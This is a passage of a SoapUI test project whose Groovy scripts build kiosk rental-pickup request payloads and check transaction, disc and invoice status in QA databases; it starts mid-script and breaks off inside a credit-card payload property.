def rentalVendStatus = context.expand( '${#TestCase#RentalVendStatus}' ); 
def purchaseVendStatus = context.expand( '${#TestCase#PurchaseVendStatus}' );
def purchaseProductType = context.expand( '${#TestCase#PurchaseProductType}' );
//MDV
def rentalMDVFlag = context.expand( '${#TestCase#RentalMDVFlag}' )
def rentalMDVDiscNumber = context.expand( '${#TestCase#RentalMDVDiscNumber}' )
def purchaseMDVFlag = context.expand( '${#TestCase#PurchaseMDVFlag}' )
def purchaseMDVDiscNumber = context.expand( '${#TestCase#PurchaseMDVDiscNumber}' )

purchaseBarcodesList = purchaseBarcodes.split(",");
purchaseVendStatusList = purchaseVendStatus.split(","); //TO-DO
purchaseProductTypeList = purchaseProductType.split(",");
rentalBarcodesList = rentalBarcodes.split(",");
rentalVendStatusList = rentalVendStatus.split(","); //TO-DO
rentalProductTypeList = rentalProductType.split(",");

//MDV
rentalMDVFlagList = rentalMDVFlag.split(",");
rentalMDVDiscNumberList = rentalMDVDiscNumber.split(",");
purchaseMDVFlagList = purchaseMDVFlag.split(",");
purchaseMDVDiscNumberList = purchaseMDVDiscNumber.split(",");
//Build Rental Payload
if (rentalCount <= 0)
{
	log.info ("No Rentals in the transaction");
	testRunner.testCase.setPropertyValue('VendedRentalsCount', VendedRentalsCount.toString());
}
else
{
	for (r = 0; r < rentalBarcodesList.size(); r++)
	{				
		currentalBarcodes = rentalBarcodesList[r].toString().trim();
		currentalVendStatus = rentalVendStatusList[r].toString().trim();
		currentalProductType = rentalProductTypeList[r].toString().trim();
		
		//MDV
		curRentalMDVFlag = rentalMDVFlagList[r].toString().trim();
		
		rentalPayload += "{"
		rentalPayload += "\"Barcode\" : \"$currentalBarcodes\","
		rentalPayload += "\"MultiDisc\" : $curRentalMDVFlag,"
		rentalPayload += "\"VendStatus\" : \"$currentalVendStatus\""
		rentalPayload += "}"
		if (r+1 < rentalBarcodesList.size())
		{
		   rentalPayload += ","
		} 
		//Capture vended rentals count and non-vended dics.
		if (currentalVendStatus.equals("Vended")) 
		{
			//Capture Vended Rental
			vendedRentalBarcodes.add(currentalBarcodes);
			VendedRentalsCount += 1 ;
		} 
		else 
		{
			//Capture Non-vended Rentals
			nonvendedRentalBarcodes.add(currentalBarcodes);
		}
	}		
	testRunner.testCase.setPropertyValue('VendedRentalBarcodes', vendedRentalBarcodes.join(",").toString());
	testRunner.testCase.setPropertyValue('NonVendedRentalBarcodes', nonvendedRentalBarcodes.join(",").toString());
	testRunner.testCase.setPropertyValue('VendedRentalsCount', VendedRentalsCount.toString());
	rentalPayload += "]}"
}

//Purchase payload
if (purchaseCount <= 0)
{
	log.info ("No Purchases in the transaction");
	testRunner.testCase.setPropertyValue('VendedPurchaseCount', VendedPurchaseCount.toString());
}
else
{
	for (p = 0; p < purchaseBarcodesList.size(); p++)
	{				
		curpurchaseBarcode = purchaseBarcodesList[p].toString().trim();
		curpurchaseVendStatus = purchaseVendStatusList[p].toString().trim();
		curpurchaseProductType = purchaseProductTypeList[p].toString().trim();

		purchasePayload += "{"
		purchasePayload += "\"Barcode\" : \"$curpurchaseBarcode\","
		purchasePayload += "\"MultiDisc\" : false,"
		purchasePayload += "\"VendStatus\" : \"$curpurchaseVendStatus\""
		purchasePayload += "}"
		
		if (p+1 < purchaseBarcodesList.size())
		{
		   purchasePayload += ","
		}
		//Capture vended rentals count and non-vended dics.
		if (curpurchaseVendStatus.equals("Vended")) 
		{
			if (curpurchaseProductType == "DigitalCode")
			{
				//Capture Vended Rental
				vendedPurchaseBarcodes.add(curpurchaseBarcode);
				VendedPurchaseCount += 1;
			}
			else
			{
				//Capture Vended Rental
				vendedPurchaseBarcodes.add(curpurchaseBarcode);
				VendedPurchaseCount += 1;
			}
		} 
		else 
		{
			//Capture Non-vended Rentals
			nonvendedPurchaseBarcodes.add(curpurchaseBarcode);
		}
	}
	testRunner.testCase.setPropertyValue('VendedPurchaseBarcodes', vendedPurchaseBarcodes.join(",").toString());
	testRunner.testCase.setPropertyValue('NonVendedPurchaseBarcodes', nonvendedPurchaseBarcodes.join(",").toString());
	testRunner.testCase.setPropertyValue('VendedPurchaseCount', VendedPurchaseCount.toString());
	purchasePayload += "]}"
}
//Generate MessageGUID
def MessageId = UUID.randomUUID().toString();
calendar = Calendar.getInstance();
def theDate = (621355968000000000 +calendar.getTimeInMillis()*10000).toString();
def dateString = (new Date().format("yyyy-MM-dd'T'HH:mm:ss.SSSSSSS"));
def Email = context.expand( '${#TestCase#Email}');
def TransactionID = context.expand( '${#TestCase#TransactionID}');
def ReferenceNumber = context.expand( '${#TestCase#ReferenceNumber}');
//Build Reconcile Request
requestPayload += "{";
requestPayload += "\"MessageType\": \"Pickup\",";
requestPayload += "\"MessageId\": \"$MessageId\",";
requestPayload += "\"EngineVersion\": \"1.15.0.6\",";
requestPayload += "\"BundleVersion\": \"2.2.2.82\",";
requestPayload += "\"Email\": \"$Email\",";
requestPayload += "\"KioskId\": $KioskId,";
requestPayload += "\"ReferenceNumber\": $ReferenceNumber,";
requestPayload += "\"Blocklisted\": false,";
requestPayload += "\"PickupDateTime\": \"$dateString\",";
requestPayload += "\"Items\": {";
if (rentalCount > 0 && purchaseCount == 0) {
	requestPayload += "$rentalPayload";
} else if (rentalCount == 0 && purchaseCount > 0) {
	requestPayload += "$purchasePayload";
} else if (rentalCount > 0 && purchaseCount > 0) {
	requestPayload += "$rentalPayload,$purchasePayload";
} else {
	log.info("No rental or purchase information generated!");
}
requestPayload += "}";
requestPayload += "}";

// log to soapui log
log.info("Pickup Request: $requestPayload");

// url encode json string
result = "payload=" + URLEncoder.encode(requestPayload)
testRunner.testCase.setPropertyValue("RequestBody",result)
testRunner.testCase.setPropertyValue("PickupGUID",MessageId.toString()); ]]></script></con:config></con:testStep><con:testStep type="httprequest" name="Pickup (Request)" id="e30ecbe7-1cc0-494b-82d0-cec6646badea"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" name="Pickup (Request)" postQueryString="false" mediaType="application/x-www-form-urlencoded" id="b2fa5210-dde2-4787-8c9d-57bcd781cdfc" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>${#Project#KSEndpoint}</con:endpoint><con:request>${#TestCase#RequestBody}</con:request><con:assertion type="GroovyScriptAssertion" name="Check for Success and HasErrors" id="70bc7102-0d46-4704-81fc-09b7237cee25"><con:configuration><scriptText>def response = URLDecoder.decode(messageExchange.getResponseContent())

log.info ("Pickup Response: $response")
	assert response.contains("\"Success\":true,")
	assert response.contains("\"HasErrors\":false,")

</scriptText></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>Basic</con:selectedAuthProfile><con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>Basic</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>Basic</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="groovy" name="Get ReferenceNumber" id="8685eac9-1d00-45a3-b078-07de920b3729"><con:settings/><con:config><script>import groovy.json.JsonSlurper
def IsOffline = context.expand( '${#TestCase#IsOffline}');
def BarcodeForTnx = context.expand( '${#TestCase#BarcodeForTnx}');
Barcode = "";
if (BarcodeForTnx == "")
{
	Barcode = context.expand( '${#TestCase#NonVendedBarcodeForTnx}');
}
else
{
	Barcode = context.expand( '${#TestCase#BarcodeForTnx}');
}

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);
def getTnxQuery = "";

if (IsOffline == 'true')
{
	//Build SQL Query
	getTnxQuery += "Select TOP 1 "
	getTnxQuery += "\n"
	getTnxQuery += "t.Transaction_ID,t.InvoiceID "
	getTnxQuery += "\n"
	getTnxQuery += "From [Transaction] t"
	getTnxQuery += "\n"
	getTnxQuery += "Inner Join Disc_Transaction dt  on t.Transaction_ID = dt.Transaction_ID "
	getTnxQuery += "\n"
	getTnxQuery += "Inner Join Disc d  on d.Disc_id = dt.Disc_id "
	getTnxQuery += "\n"
	getTnxQuery += "Where d.RF_ID = '$Barcode'"
	getTnxQuery += "\n"
	getTnxQuery += "Order by t.Transaction_ID desc"

	def getTnxInfo = sql.firstRow(getTnxQuery);
	def TransactionID = getTnxInfo.Transaction_ID.toString();
	def InvoiceID = getTnxInfo.InvoiceID.toString();
	log.info ("TransactionID:$TransactionID; InvoiceID:$InvoiceID");
	testRunner.testCase.setPropertyValue("TransactionID",TransactionID);
	testRunner.testCase.setPropertyValue("InvoiceID",InvoiceID);
}
else
{
	log.info ("TransactionId is generated from Auth");
}</script></con:config></con:testStep><con:testStep type="jdbc" name="Check Transaction" id="af509a84-2896-4a00-87df-2a3067625bb9"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT  
	transaction_status,
	approvalcode,
	RentalType,
	OptInTypeId,
	BillingTypeID,
	IsOffline,
	shoppingCartType
FROM
	[Transaction](nolock)
WHERE 
	transaction_id = :txnid</con:query><con:assertion type="GroovyScriptAssertion" name="Validations" id="32f2af03-b987-432f-a201-9858d49438c3"><con:configuration><scriptText>//Get the actual values from JDBC response
def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def actualAppprovalCode = holder.getNodeValue("//APPROVALCODE[1]");
String approve = actualAppprovalCode.toString();	
assert approve.substring(0,8) == 'Approved';

def numrentals = context.expand( '${#TestCase#RentalCount}' ).toInteger();
def numpurchases = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();
def CCType = context.expand( '${#TestCase#CardType}' ).toInteger();

/*
int actualBillingTypeID = holder.getNodeValue("//BILLINGTYPEID[1]").toInteger();
//Added if and else logic for PRM and PRG functionality and GiftCard.
if ((numrentals > 0 &amp;&amp; numpurchases > 0) || CCType == 6)
{
	assert actualBillingTypeID == 6; //Because of PRM and PRG functionality.
}
else
{
	assert actualBillingTypeID == 7;
}
*/</scriptText></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" name="Check [RENTALTYPE]" id="41d4abab-7b86-425c-8d6c-ceeb83aaa819"><con:configuration><scriptText>def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def rentalType = holder.getNodeValue("//RENTALTYPE[1]");

assert rentalType == '3'</scriptText></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" id="1ed83441-2817-4b26-9b40-e57d25b3b968" name="Validations-[TransactionStatus]"><con:configuration><scriptText>//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def actualAppprovalCode = holder.getNodeValue("//APPROVALCODE[1]");
def offline = context.expand( '${#TestCase#IsOffline}' );
def actualTransactionStatus = holder.getNodeValue("//TRANSACTION_STATUS[1]").toInteger();
String approve = actualAppprovalCode.toString();
//Rental and Purchase after vend/reconcile
def numrentals = context.expand( '${#TestCase#VendedRentalsCount}' ).toInteger();
def numpurchases = context.expand( '${#TestCase#VendedPurchaseCount}' ).toInteger();
//Rental and Purchase before vend/reconcile
def rentalCount = context.expand( '${#TestCase#RentalCount}' ).toInteger();
def purchaseCount = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();
def rentalVendStatus = context.expand( '${#TestCase#RentalVendStatus}' );
def purchaseVendStatus = context.expand( '${#TestCase#PurchaseVendStatus}' );

rentalVendStatusList = rentalVendStatus.split(",");
currentalVendStatus = rentalVendStatusList.take(1).toString().replace("[", "").replace("]", "");
purchaseVendStatusList = purchaseVendStatus.split(",");
curpurchaseVendStatus = purchaseVendStatusList.take(1).toString().replace("[", "").replace("]", "");

//Check TransactionStatus
if ((numrentals > 0 || numpurchases > 0) &amp;&amp; (approve.contains("Approved") || offline == 'true'))
{
	assert (actualTransactionStatus == 4);
}
else if ((numrentals > 0 || numpurchases > 0) &amp;&amp;  (!approve.contains("Approved") || offline != 'true'))
{
	assert (actualTransactionStatus == 5);
}
else
{
	if (rentalCount > 0)
	{
		def tnxStatusQuery = sql.firstRow("select TransactionStatusID from TransactionStatus Where replace(Description,' ','') like '%" + currentalVendStatus + "%'");
		def expectedTransactionStatus = tnxStatusQuery.TransactionStatusID.toInteger();
		log.info ("expectedTransactionStatus:$expectedTransactionStatus; actualTransactionStatus:$actualTransactionStatus");
		assert (actualTransactionStatus == expectedTransactionStatus);
		
	}
	else if (purchaseCount > 0)
	{
		def tnxStatusQuery = sql.firstRow("select TransactionStatusID from TransactionStatus Where replace(Description,' ','') like '%" + curpurchaseVendStatus + "%'");
		def expectedTransactionStatus = tnxStatusQuery.TransactionStatusID.toInteger();
		log.info ("expectedTransactionStatus:$expectedTransactionStatus; actualTransactionStatus:$actualTransactionStatus");
		assert (actualTransactionStatus == expectedTransactionStatus);
	}
}</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>txnid</con:name><con:value>${#TestCase#TransactionID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check DiscTransaction" id="99dc8f9c-f728-4850-87a9-8cb09f48ddac"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT
	DISCTRANSACTION_STATUS
FROM
	disc_transaction (nolock)
WHERE
	transaction_id = :TransactionID</con:query><con:assertion type="GroovyScriptAssertion" id="083f13be-1903-4cfe-971b-c5d2b61e5086" name="DiscTransaction Status"><con:configuration><scriptText><![CDATA[def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check DiscTransaction#ResponseAsXml");
def actualDiscTransactionStatus = holder.getNodeValue("//Row[1]/DISCTRANSACTION_STATUS[1]");

def vendedRentals = context.expand( '${#TestCase#VendedRentalBarcodes}' )
def nonVendedRentals = context.expand( '${#TestCase#nonvendedRentalBarcodes}' )
def vendedPurchases = context.expand( '${#TestCase#VendedPurchaseBarcodes}' )
def nonVendedPurchases = context.expand( '${#TestCase#NonVendedPurchaseBarcodes}' )

if (vendedPurchases == "")
{
	if ((nonVendedRentals != "") && (vendedRentals == "")) 
	{
		assert actualDiscTransactionStatus.toInteger() == 1
	}		 
	else if ((nonVendedRentals == "") && (vendedRentals != ""))
	{
		assert actualDiscTransactionStatus.toInteger() == 2
	}		
	else if ((nonVendedRentals != "") && (vendedRentals != ""))
	{
		assert actualDiscTransactionStatus.toInteger() == 2
	}		
	else 
	{
		assert actualDiscTransactionStatus.toInteger() == 1
	}		
}
else
{
	assert actualDiscTransactionStatus.toInteger() == 2
}]]></scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>TransactionID</con:name><con:value>${#TestCase#TransactionID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check Invoice Details" id="a4b692db-e752-446e-8401-5c361c07a3d0"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>MerchantService</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB102.rb.local:1433;databaseName=MerchantService;integratedSecurity=true</con:connectionString><con:password>tes</con:password><con:connectionProperties/><con:query>SELECT TOP 1
	i.[Status] AS InvStatus, 
	i.[System], 
	i.CreatedBy, 
	i.StoreNumber,
	i.CollectionMethod,
	ii.[Status]  AS InvItemStatus
FROM
	[Invoice] i (nolock)
INNER JOIN [InvoiceItem] ii ON i.OID = ii.Invoice
WHERE 
	i.OID = :InvoiceID</con:query><con:assertion type="XPath Match" id="240a02f9-cf29-49b8-bec1-b5f1e1e60717" name="Match content of [STATUS]" disabled="true"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/STATUS[1]/text()</path><content>0</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="efcc78e9-3208-4611-b3d8-4fbdcd0ddd89" name="Match content of [SYSTEM]"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/SYSTEM[1]/text()</path><content>Rental Systems</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="96905afe-9a46-4b0b-9840-dfdfb72b774e" name="Match content of [CREATEDBY]" disabled="true"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/CREATEDBY[1]/text()</path><content>RB\KioskSvc_01_U</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="XPath Match" id="3c2f7519-7ffa-408a-b2e2-fd6ce8cd05da" name="InvoiceItem Status" disabled="true"><con:configuration><path>//Results[1]/ResultSet[1]/Row[1]/STATUS[2]/text()</path><content>2</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" id="4207b007-8259-4190-b87f-c52ed3829198" name="CollectionMethod"><con:configuration><scriptText>import java.text.DecimalFormat;
//Round4 = new DecimalFormat("#.####");

def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context );
def invholder = groovyUtils.getXmlHolder( "Check Invoice Details#ResponseAsXml");
def actualCollectionMethod = invholder.getNodeValue("//COLLECTIONMETHOD[1]").toInteger();
def cardType = context.expand( '${#TestCase#CardType}' ).toInteger();

//Get the shopping cart type value from Get Transaction test step.
def tnxHolder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def shoppingCartType = tnxHolder.getNodeValue("//SHOPPINGCARTTYPE[1]").toInteger();

//based on config in QADB100.RedboxServerDB.dbo.KioskBillingConfig table
if ((shoppingCartType == 2)||(shoppingCartType == 3)||(cardType == 6))
{
	assert actualCollectionMethod == 3;
}
else
{
	assert actualCollectionMethod == 6;
}</scriptText></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" id="444868cb-53b3-4d5b-b65e-bda98e8c4f41" name="Invoice/InvoiceItem Status"><con:configuration><scriptText>//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Validate Invoice and InvoiceItem status.
def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context );
def invholder = groovyUtils.getXmlHolder( "Check Invoice Details#ResponseAsXml");
def actualInvoiceStatus = invholder.getNodeValue("//INVSTATUS[1]").toInteger();
def actualInvoiceItemStatus = invholder.getNodeValue("//INVITEMSTATUS[1]").toInteger();
def InvoiceID = context.expand( '${#TestCase#InvoiceID}' );
//def AmountBase = context.expand( '${#TestCase#TransactionTotal}' ).toBigDecimal().setScale(2, BigDecimal.ROUND_HALF_UP);
def getAmount = sql.firstRow("Select Sum (Quantity * AmountBase) as TransactionTotal from InvoiceItem Where Invoice = $InvoiceID");
def AmountBase = getAmount.TransactionTotal
def CardType = context.expand( '${#TestCase#CardType}' ).toInteger();
def IsOffline = context.expand( '${#TestCase#IsOffline}' );
def RentalCount = context.expand( '${#TestCase#VendedRentalsCount}' ).toInteger();
def PurchaseCount = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();
log.info ("AmountBase:$AmountBase; actualInvoiceStatus:$actualInvoiceStatus; actualInvoiceItemStatus:$actualInvoiceItemStatus");
//log.info ("CardType:$CardType; IsOffline:$IsOffline");
//Online Case

if ((AmountBase == null) || (AmountBase == 0E-20))
{
	if (CardType == 6)
	{		
     	if (RentalCount == 0 &amp;&amp; PurchaseCount == 0)
     	{
     		assert (actualInvoiceStatus == 4);
     		assert (actualInvoiceItemStatus == 15);
     	}
     	else
     	{ 		
     		assert (actualInvoiceStatus == 1);
     		assert (actualInvoiceItemStatus == 16);
     	}
     	
	}
	else
	{
		assert (actualInvoiceStatus == 1);
     	assert (actualInvoiceItemStatus == 17);
	}
}
else
{
  if (PurchaseCount > 0 || CardType == 6)
  {
      assert (actualInvoiceStatus == 1);
      assert (actualInvoiceItemStatus == 3);
  }
  else
  {
      assert (actualInvoiceStatus == 1);
      assert (actualInvoiceItemStatus == 17);
  }
}
</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>InvoiceID</con:name><con:value>${#TestCase#InvoiceID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check Disc Status" id="f696eaf1-b2e0-4a3a-8e1d-641a804b1703"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT 
	Physical_Status 
FROM 
	Disc as d
inner join 
	Disc_Transaction as dt
on 
	d.Disc_ID=dt.Disc_ID
where
	 dt.Transaction_ID= :TransactionID</con:query><con:assertion type="GroovyScriptAssertion" name="Assert node [Row]" id="39f9cf12-b464-42a1-82ef-b8f46f0da842"><con:configuration><scriptText>import com.eviware.soapui.support.XmlHolder
import java.util.*

def gv = new com.eviware.soapui.support.GroovyUtils(context);
def rawXML = context.expand( '${Check Disc Status#ResponseAsXml#//Results[1]}' )
def holder = gv.getXmlHolder(rawXML)
def nodecount = holder["count(//Results[1]/ResultSet[1]/Row)"]
def physicalstatusArray = [5] ;

def vendedRentals = context.expand( '${#TestCase#VendedRentalBarcodes}' )
def nonVendedRentals = context.expand( '${#TestCase#nonvendedRentalBarcodes}' )
def vendedPurchases = context.expand( '${#TestCase#VendedPurchaseBarcodes}' )
def nonVendedPurchases = context.expand( '${#TestCase#NonVendedPurchaseBarcodes}' )
log.info ("vendedRentals:$vendedRentals; vendedPurchases:$vendedPurchases");

for (i = 1; i &lt;= nodecount.toInteger(); i++)
{
    def responseAsXml = context.expand( '${Check Disc Status#ResponseAsXml#//Results[1]/ResultSet[1]/Row['+i+']/PHYSICAL_STATUS[1]}' );
    physicalstatusArray[i-1] = responseAsXml.toInteger();
    //log.info('physicalstatusArray : ' + physicalstatusArray)
}
    if(vendedPurchases != "")
    {
        //log.info("only purchase")
        assert physicalstatusArray.contains(8)
        
    }
    else if(vendedRentals != "")
    {
        //log.info("only Rental")
        assert physicalstatusArray.contains(3)
    }
    else 
    {
        def transactionStatus = context.expand( '${Check Transaction#ResponseAsXml#//Results[1]/ResultSet[1]/Row[1]/TRANSACTION_STATUS[1]}' );
        if (transactionStatus == '11')
        {
            assert physicalstatusArray.contains(9)
        }
        else
        {
            assert physicalstatusArray.contains(2)
        }        
    }</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>TransactionID</con:name><con:value>${#TestCase#TransactionID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="Check Message Control" id="75409af1-e15e-4183-9b91-58ab7afe60e0"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT
	ProcessFlag
FROM 
	MessageControl(nolock)
WHERE
	MessageId = :GUID</con:query><con:assertion type="Simple Contains" name="Contains" id="4e246be7-4cee-4b19-9b66-d23e79c330d8"><con:configuration><token>&lt;PROCESSFLAG>2&lt;/PROCESSFLAG></token><ignoreCase>false</ignoreCase><useRegEx>false</useRegEx></con:configuration></con:assertion><con:properties><con:property><con:name>GUID</con:name><con:value>${#TestCase#PickupGUID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="groovy" name="Pickup Completed" id="f42cb5ea-4cda-4fc1-9763-f3e86f39d765"><con:settings/><con:config><script>//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Update Physical Status = 2 for Digital Codes.
sql.executeUpdate("UPDATE disc SET physical_status = 2 Where KioskClient_ID = 1505 and Title_ID in (Select Title_ID from Title Where FormatId = 17)")</script></con:config></con:testStep><con:setupScript>import groovy.sql.Sql
log.info("Loading SQL Driver for Auth");
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
log.info("End loading SQL Driver for Auth");</con:setupScript><con:tearDownScript><![CDATA[//if results file global property is populated,  
//record the testcase name with id
//add mingle card link if mingle property is set

def file = new File(context.expand( '${ResultsFile}' ))
if (context.expand( '${ResultsFile}' ) != null && file.exists()) {
file.append(testRunner.testCase.name + "</td><td><a href=\"http://mingle:8080/projects/server_platform/cards/" + 
context.expand('${#TestCase#Mingle}') + "\">" +context.expand('${#TestCase#Mingle}') +
"</a></td><td>" + context.expand('${#TestCase#Id}') + '\r\n')
} 
]]></con:tearDownScript><con:properties><con:property><con:name>Email</con:name><con:value>rental.automation@gmail.com</con:value></con:property><con:property><con:name>KioskID</con:name><con:value>1505</con:value></con:property><con:property><con:name>UseCredits</con:name><con:value>0</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.7500</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>RentalVendStatus</con:name><con:value>DiskNotTaken,NotVended</con:value></con:property><con:property><con:name>PurchaseVendStatus</con:name><con:value/></con:property><con:property><con:name>IsOffline</con:name><con:value>false</con:value></con:property><con:property><con:name>ReferenceNumber</con:name><con:value>5648734</con:value></con:property><con:property><con:name>PurchaseCount</con:name><con:value>0</con:value></con:property><con:property><con:name>PurchaseBarcodes</con:name><con:value/></con:property><con:property><con:name>PurchaseTitleIds</con:name><con:value/></con:property><con:property><con:name>PurchaseProductFamily</con:name><con:value/></con:property><con:property><con:name>PurchaseProductType</con:name><con:value/></con:property><con:property><con:name>PurchaseDiscPrice</con:name><con:value/></con:property><con:property><con:name>RentalCount</con:name><con:value>2</con:value></con:property><con:property><con:name>RentalBarcodes</con:name><con:value>000150501,000027376</con:value></con:property><con:property><con:name>RentalTitleIds</con:name><con:value>986,400147</con:value></con:property><con:property><con:name>RentalProductFamily</con:name><con:value>Movies,Movies</con:value></con:property><con:property><con:name>RentalProductType</con:name><con:value>DVD,Blu-ray</con:value></con:property><con:property><con:name>RentalDiscPrice</con:name><con:value>1.75,2.00</con:value></con:property><con:property><con:name>RentalNonReturnPrice</con:name><con:value>28.00,32.00</con:value></con:property><con:property><con:name>RentalNonReturnDays</con:name><con:value>16,16</con:value></con:property><con:property><con:name>HasPhysicalPurchase</con:name><con:value>false</con:value></con:property><con:property><con:name>DiscountPayload</con:name><con:value>{"ProductId": 986,"DiscountType": "Loyalty","PromotionCode": null,"RedemptionPoints": 1500,"Amount": 1.75},{"ProductId": 400147,"DiscountType": "PromotionCode","PromotionCode": "DVDONME","PromotionCodeValue": "1.50","PromotionIntentCode": 7,"Amount": 1.5}</con:value></con:property><con:property><con:name>CCPayload</con:name><con:value>"CreditCard": {"FirstName": "Redbox","LastName": "Server","Number": 